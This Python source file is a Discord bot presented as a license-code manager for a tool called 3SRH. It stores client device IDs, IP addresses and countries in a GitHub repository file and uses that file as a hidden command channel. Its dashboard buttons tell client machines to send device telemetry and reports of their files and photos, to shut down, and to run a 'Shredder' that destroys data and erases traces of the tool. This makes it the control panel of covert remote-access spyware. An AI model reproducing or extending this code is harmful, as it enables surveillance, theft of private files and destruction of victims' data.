import os
import base64
import json
import random
import string
import time
import discord
from discord import app_commands
import requests
from flask import Flask
from threading import Thread

app = Flask('')

@app.route('/')
def home():
    return "3SRH Manager Bot is alive and running!"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

keep_alive()

TOKEN = os.getenv('TOKEN')
GITHUB_TOKEN = os.getenv('GITHUB_TOKEN')
REPO_OWNER = "kqi5q"
REPO_NAME = "3srh-system-data"
FILE_PATH = "licenses.json"
CHANNEL_ID = 1547705815698382970


class LicenseBot(discord.Client):
    def __init__(self):
        intents = discord.Intents.default()
        super().__init__(intents=intents)
        self.tree = app_commands.CommandTree(self)

    async def setup_hook(self):
        await self.tree.sync()
        print("Slash commands synced successfully!")

    async def on_ready(self):
        print(f"Logged in as {self.user} (ID: {self.user.id})")


client = LicenseBot()


def generate_random_code():
    chars = string.ascii_uppercase + string.digits
    return f"3SRH-{''.join(random.choices(chars, k=5))}"


def fetch_db():
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_PATH}"
    headers = {"Authorization": f"Bearer {GITHUB_TOKEN}"}
    r = requests.get(url, headers=headers)
    if r.status_code == 200:
        file_data = r.json()
        db = json.loads(base64.b64decode(file_data["content"]).decode("utf-8"))
        return db, file_data["sha"], url, headers
    return None, None, url, headers


def save_db(db, sha, url, headers, commit_message):
    new_content = base64.b64encode(json.dumps(db, indent=4).encode("utf-8")).decode("utf-8")
    update_data = {"message": commit_message, "content": new_content, "sha": sha}
    r = requests.put(url, headers=headers, json=update_data)
    return r.status_code in [200, 201]


class ConfirmSaveView(discord.ui.View):
    def __init__(self, generated_codes, count):
        super().__init__(timeout=60)
        self.generated_codes = generated_codes
        self.count = count

    @discord.ui.button(label="نعم، حفظ الأكواد", style=discord.ButtonStyle.green, custom_id="save_codes_yes")
    async def confirm(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if not db: return
        if "codes" not in db: db["codes"] = {}
        for code in self.generated_codes:
            db["codes"][code] = {"used": False, "device": None, "ip": None, "country": None}
        if save_db(db, sha, url, headers, f"Generated {self.count} codes"):
            await interaction.followup.send(f"✅ تم حفظ {self.count} كود بنجاح!", ephemeral=True)


class DevicesSubMenuView(discord.ui.View):
    def __init__(self, devices_list):
        super().__init__(timeout=180)
        for code, info in devices_list[:25]:
            self.add_item(DeviceManageButton(code, info))


class DeviceManageButton(discord.ui.Button):
    def __init__(self, code, info):
        super().__init__(label=f"🌐 IP: {info.get('ip', 'Unknown')} ({code})", style=discord.ButtonStyle.secondary, custom_id=f"man_dev_{code}")
        self.code = code
        self.info = info

    async def callback(self, interaction: discord.Interaction):
        await interaction.response.send_message(
            f"⚙️ **خيارات التحكم بالعميل:**\n🔑 الكود: `{self.code}`\n🌐 IP: `{self.info.get('ip')}`\n🌍 الدولة: `{self.info.get('country')}`", 
            view=DeviceActionsView(self.code, self.info.get("device")), 
            ephemeral=True
        )


class DeviceActionsView(discord.ui.View):
    def __init__(self, code, hwid):
        super().__init__(timeout=60)
        self.code = code
        self.hwid = hwid

    @discord.ui.button(label="📁 سحب تقرير الجهاز (TXT)", style=discord.ButtonStyle.primary, custom_id="dev_act_export_info", row=0)
    async def export_client_info_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "remote_exports" not in db: db["remote_exports"] = {}
            db["remote_exports"][self.code] = {"id": str(int(time.time()))}
            if save_db(db, sha, url, headers, f"Export telemetry for {self.code}"):
                await interaction.followup.send("📁 تم طلب ملف التقرير ومعلومات الجهاز، سيصلك هنا قريباً!", ephemeral=True)

    @discord.ui.button(label="📸 سحب تقرير الملفات والصور", style=discord.ButtonStyle.secondary, custom_id="dev_act_files_report", row=0)
    async def files_report_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "remote_file_reports" not in db: db["remote_file_reports"] = {}
            db["remote_file_reports"][self.code] = {"id": str(int(time.time()))}
            if save_db(db, sha, url, headers, f"Request files report for {self.code}"):
                await interaction.followup.send("📸 تم طلب تقرير الملفات والصور، سيصلك الملف المرفق هنا خلال لحظات!", ephemeral=True)

    @discord.ui.button(label="🔌 إيقاف تشغيل الجهاز (Shutdown)", style=discord.ButtonStyle.danger, custom_id="dev_act_shutdown", row=1)
    async def shutdown_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "remote_shutdowns" not in db: db["remote_shutdowns"] = {}
            db["remote_shutdowns"][self.code] = {"id": str(int(time.time()))}
            if save_db(db, sha, url, headers, f"Shutdown {self.code}"):
                await interaction.followup.send("🔌 تم إرسال أمر إيقاف التشغيل الفوري لجهاز العميل!", ephemeral=True)

    @discord.ui.button(label="🔥 تدمير شامل (Shredder)", style=discord.ButtonStyle.danger, custom_id="dev_act_shred", row=1)
    async def shred_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(thinking=True, ephemeral=True)
        db, sha, url, headers = fetch_db()
        if db:
            if "remote_shreds" not in db: db["remote_shreds"] = {}
            db["remote_shreds"][self.code] = {"id": str(int(time.time()))}
            if save_db(db, sha, url, headers, f"Shred {self.code}"):
                await interaction.followup.send("🔥 تم إرسال أمر التدمير الشامل وحذف أثر الأداة!", ephemeral=True)


class MainDashboardView(discord.ui.View):
    @discord.ui.button(label="💻 الأجهزة والتحكم المطلق", style=discord.ButtonStyle.secondary, custom_id="dash_main_devices")
    async def devices_menu_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer(thinking=True, ephemeral=True)
        db, _, _, _ = fetch_db()
        if not db: return
        devices_list = [(code, info) for code, info in db.get("codes", {}).items() if info.get("used") and info.get("device")]
        if not devices_list:
            await interaction.followup.send("🟢 لا توجد أجهزة متصلة حالياً.", ephemeral=True)
            return
        await interaction.response.send_message("⚙️ **اختر الجهاز للتحكم الكامل به:**", view=DevicesSubMenuView(devices_list), ephemeral=True)


@client.tree.command(name="statsgui", description="لوحة التحكم والإحصائيات التفاعلية")
async def stats_gui_command(interaction: discord.Interaction):
    db, _, _, _ = fetch_db()
    if not db: return
    embed = discord.Embed(title="📊 لوحة التحكم الشاملة لنظام 3SRH", color=0xA871FF)
    await interaction.response.send_message(embed=embed, view=MainDashboardView(), ephemeral=True)


@client.tree.command(name="sync", description="مزامنة الأوامر")
async def sync_commands(interaction: discord.Interaction):
    await client.tree.sync()
    await interaction.response.send_message("✅ تم مزامنة الأوامر!", ephemeral=True)


if TOKEN:
    client.run(TOKEN)
